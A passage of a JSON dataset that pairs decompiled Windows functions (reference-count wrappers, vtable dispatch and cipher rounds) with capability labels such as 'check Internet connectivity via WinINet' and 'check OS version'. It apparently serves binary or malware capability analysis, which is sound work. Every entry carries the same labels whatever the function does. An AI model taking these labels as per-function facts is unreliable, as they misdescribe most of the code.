        "decompiled_code": "\nint32_t fcn.20011f79(void)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x45) || (pcVar1 = (**in_EAX)[0x11],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) && ((*in_EAX)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "20011fce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20011fce(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.20011bd4();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x49) || (pcVar1 = (**arg_8h)[0x12],  pcVar1 == NULL)) {\n            fcn.20011aba();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h != 0) || (*arg_ch == 0)) {\n                if ((*arg_8h)[1] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.20011aba();\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 290
    },
    "20012312": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20012312(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t **unaff_EDI;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedDecrement;\n    piVar2 = *unaff_EDI;\n    piVar1 = piVar2 + 3;\n    if ((0 < *piVar1) && (iVar4 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(piVar1),  iVar4 == 0)) {\n        fcn.200139c9(unaff_EDI, 3);\n        (**(**unaff_EDI + 0x18))();\n        (*_sym.imp.msvcrt.dll_free)(piVar2);\n        (*pcVar3)(0x20046eb0);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "2001262c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.2001262c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.20001567(0x20046eb4);\n    iVar1 = fcn.20013a3e();\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*in_EAX + 4) == 0) {\n        fcn.200228fc();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.2000157d(0x20046eb4);\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "20012b26": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20012b26(void)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.2001262c();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x51) || (pcVar1 = (**in_EAX)[0x14],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) && ((*in_EAX)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20012312();\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "20012b7f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20012b7f(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    \n    iVar2 = fcn.2001262c();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x55) || (pcVar1 = (**in_EAX)[0x15],  pcVar1 == NULL)) {\n            fcn.20012312();\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) || (*unaff_ESI == 0)) {\n                if ((*in_EAX)[1] != 0) {\n                    iVar2 = 0x21590006;\n                }\n                fcn.20012312();\n                *unaff_ESI = 0;\n                *arg_14h = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 262
    },
    "20012bf1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20012bf1(void)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.2001262c();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x59) || (pcVar1 = (**in_EAX)[0x16],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) && ((*in_EAX)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20012312();\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "200131f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.200131f7(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t **unaff_EDI;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedDecrement;\n    piVar2 = *unaff_EDI;\n    piVar1 = piVar2 + 3;\n    if ((0 < *piVar1) && (iVar4 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(piVar1),  iVar4 == 0)) {\n        fcn.200139c9(unaff_EDI, 2);\n        (**(**unaff_EDI + 0x14))();\n        (*_sym.imp.msvcrt.dll_free)(piVar2);\n        (*pcVar3)(0x20046ed4);\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "20013237": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20013237(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    ppiVar1 = *param_1;\n    fcn.20001567(0x20046ed8);\n    iVar3 = fcn.20013a3e(ppiVar1, 2);\n    if ((iVar3 == 0) || (piVar2 = *ppiVar1,  piVar2[1] != 0)) {\n        fcn.2000157d(0x20046ed8);\n    }\n    else {\n        piVar2[2] = param_2;\n        piVar2[1] = 1;\n        fcn.2000157d(0x20046ed8);\n        (**(**ppiVar1 + 0x10))(ppiVar1, param_2);\n        fcn.200131f7();\n    }\n    *param_1 = NULL;\n    return;\n}\n",
        "token_count": 230
    },
    "20013299": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20013299(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.20013a3e(param_1, 2);\n    if ((iVar1 != 0) && (param_2 != 0)) {\n        (**(**param_1 + 0x34))(param_1, param_2);\n        fcn.200131f7();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "200132c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.200132c8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.20001567(0x20046ed8);\n    iVar1 = fcn.20013a3e();\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*in_EAX + 4) == 0) {\n        fcn.200228fc();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.2000157d(0x20046ed8);\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "20013311": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20013311(int32_t **arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t var_4h;\n    \n    var_4h = fcn.200132c8();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x1d) || (pcVar1 = (**arg_8h)[7],  pcVar1 == NULL)) {\n            fcn.200131f7();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h);\n            if (var_4h == 0) {\n                piVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                if (piVar2 == NULL) {\n                    fcn.200131f7();\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    return 0x21590004;\n                }\n                iVar3 = **arg_8h;\n                piVar2[1] = 0;\n                piVar2[2] = 0;\n                *piVar2 = iVar3;\n                piVar2[3] = 1;\n                **arg_ch = piVar2;\n                iVar3 = fcn.2001396b(*arg_ch, 2);\n                if (iVar3 == 0) {\n                    (*_sym.imp.msvcrt.dll_free)(piVar2);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    var_4h = 0x21590004;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0x20046ed4);\n                }\n            }\n            else if ((*arg_8h)[1] != 0) {\n                var_4h = 0x21590006;\n            }\n            fcn.200131f7();\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 495
    },
    "2001348f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.2001348f(int32_t **param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x19) || (pcVar1 = (**param_1)[6],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.200131f7();\n    }\n    return iVar2;\n}\n",
        "token_count": 183
    },
    "20013534": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20013534(int32_t **param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x25) || (pcVar1 = (**param_1)[9],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.200131f7();\n    }\n    return iVar2;\n}\n",
        "token_count": 191
    },
    "20013589": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20013589(int32_t **param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x29) || (pcVar1 = (**param_1)[10],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3, param_4);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.200131f7();\n    }\n    return iVar2;\n}\n",
        "token_count": 200
    },
    "200135e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200135e2(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.200132c8();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x2d) || (pcVar1 = (**arg_8h)[0xb],  pcVar1 == NULL)) {\n            fcn.200131f7();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) || (*arg_ch == 0)) {\n                if ((*arg_8h)[1] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.200131f7();\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 282
    },
    "20013656": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20013656(int32_t **arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    code *pcVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.200132c8();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x31) || (pcVar1 = (**arg_8h)[0xc],  pcVar1 == NULL)) {\n            fcn.200131f7();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if ((var_4h != 0) || (*arg_14h == 0)) {\n                if ((*arg_8h)[1] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.200131f7();\n                *arg_14h = 0;\n                *arg_18h = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 306
    },
    "200136d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200136d0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x3d) || (pcVar1 = (**arg_8h)[0xf],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.200131f7();\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "2001372c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001372c(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x41) || (pcVar1 = (**arg_8h)[0x10],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.200131f7();\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "20013788": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20013788(void)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x45) || (pcVar1 = (**in_EAX)[0x11],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) && ((*in_EAX)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.200131f7();\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "200137d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.200137d9(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    \n    iVar2 = fcn.200132c8();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x49) || (pcVar1 = (**in_EAX)[0x12],  pcVar1 == NULL)) {\n            fcn.200131f7();\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) || (*unaff_ESI == 0)) {\n                if ((*in_EAX)[1] != 0) {\n                    iVar2 = 0x21590006;\n                }\n                fcn.200131f7();\n                *unaff_ESI = 0;\n                *arg_ch = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 249
    },
    "20013a8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20013a8a(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t var_4h;\n    \n    var_4h = arg_8h[1];\n    uVar2 = *arg_8h;\n    uVar1 = sub.msvcrt.dll__lrotl(*arg_ch + var_4h, arg_ch[1]);\n    uVar2 = uVar2 ^ ((*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar1 >> 0x18) * 4 + 0x2002e1c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[2] ^ uVar2, arg_ch[3]);\n    var_4h = var_4h ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar1 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[4] - var_4h, arg_ch[5]);\n    uVar2 = uVar2 ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar1 & 0xff) * 4 + 0x2002ddc8) ^\n                    *((uVar1 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[6] + uVar2, arg_ch[7]);\n    var_4h = var_4h ^ ((*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar1 >> 0x18) * 4 + 0x2002e1c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[8] ^ var_4h, arg_ch[9]);\n    uVar2 = uVar2 ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar1 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[10] - uVar2, arg_ch[0xb]);\n    var_4h = var_4h ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar1 & 0xff) * 4 + 0x2002ddc8) ^\n                      *((uVar1 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0xc] + var_4h, arg_ch[0xd]);\n    uVar2 = uVar2 ^ ((*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar1 >> 0x18) * 4 + 0x2002e1c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0xe] ^ uVar2, arg_ch[0xf]);\n    var_4h = var_4h ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar1 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x10] - var_4h, arg_ch[0x11]);\n    uVar2 = uVar2 ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar1 & 0xff) * 4 + 0x2002ddc8) ^\n                    *((uVar1 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x12] + uVar2, arg_ch[0x13]);\n    var_4h = var_4h ^ ((*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                      *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar1 >> 0x18) * 4 + 0x2002e1c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x14] ^ var_4h, arg_ch[0x15]);\n    uVar2 = uVar2 ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                    *((uVar1 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x16] - uVar2, arg_ch[0x17]);\n    var_4h = var_4h ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar1 & 0xff) * 4 + 0x2002ddc8) ^\n                      *((uVar1 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n    if (arg_ch[0x20] == 0) {\n        uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x18] + var_4h, arg_ch[0x19]);\n        uVar2 = uVar2 ^ ((*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                        *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar1 >> 0x18) * 4 + 0x2002e1c8);\n        uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x1a] ^ uVar2, arg_ch[0x1b]);\n        var_4h = var_4h ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) - *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                          *((uVar1 >> 0x18) * 4 + 0x2002e1c8) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n        uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x1c] - var_4h, arg_ch[0x1d]);\n        uVar2 = uVar2 ^ (*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar1 & 0xff) * 4 + 0x2002ddc8) ^\n                        *((uVar1 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n        uVar1 = sub.msvcrt.dll__lrotl(arg_ch[0x1e] + uVar2, arg_ch[0x1f]);\n        var_4h = var_4h ^ ((*((uVar1 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar1 & 0xff) * 4 + 0x2002ddc8)) +\n                          *((uVar1 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar1 >> 0x18) * 4 + 0x2002e1c8);\n    }\n    arg_8h[1] = uVar2;\n    *arg_8h = var_4h;\n    return;\n}\n",
        "token_count": 2468
    },
    "20013ea8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.20013ea8(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = arg_8h[1];\n    uVar6 = *arg_8h;\n    if (arg_ch[0x20] == 0) {\n        uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x1e] + var_4h, arg_ch[0x1f]);\n        uVar6 = uVar6 ^ ((*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) ^ *((uVar4 & 0xff) * 4 + 0x2002ddc8)) +\n                        *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8)) - *((uVar4 >> 0x18) * 4 + 0x2002e1c8);\n        uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x1c] - uVar6, arg_ch[0x1d]);\n        var_4h = var_4h ^ (*((uVar4 >> 8 & 0xff) * 4 + 0x2002d9c8) + *((uVar4 & 0xff) * 4 + 0x2002ddc8) ^\n                          *((uVar4 >> 0x18) * 4 + 0x2002e1c8)) - *((uVar4 >> 0x10 & 0xff) * 4 + 0x2002e5c8);\n        uVar4 = sub.msvcrt.dll__lrotl(arg_ch[0x1a] ^ var_4h, arg_ch[0x1b]);\n        uVar6 = uVar6 